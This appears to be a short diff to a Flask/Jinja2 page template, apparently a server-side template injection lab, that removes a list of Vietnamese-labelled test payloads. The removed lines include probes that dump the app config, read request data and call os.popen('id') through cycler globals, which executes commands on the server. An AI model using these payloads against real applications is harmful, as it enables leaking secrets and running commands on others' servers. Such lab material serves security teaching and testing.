@@ -66,15 +66,6 @@ def index():
         <strong>Xin chào: %PAYLOAD%</strong>
       </div>
 
-      <details style="margin-top:1rem">
-        <summary>Một số payload test</summary>
-        <ul>
-          <li><code>{{ '{{7*7}}' }}</code></li>
-          <li><code>{{ '{{config}}' }}</code> </li>
-          <li><code>{{ \"{{ request.environ['SERVER_NAME'] }}\" }}</code></li>
-          <li><code>{{ \"{{ cycler.__init__.__globals__.os.popen('id').read() }}\" }}</code></li>
-        </ul>
-      </details>
     {% endblock %}
     """
 
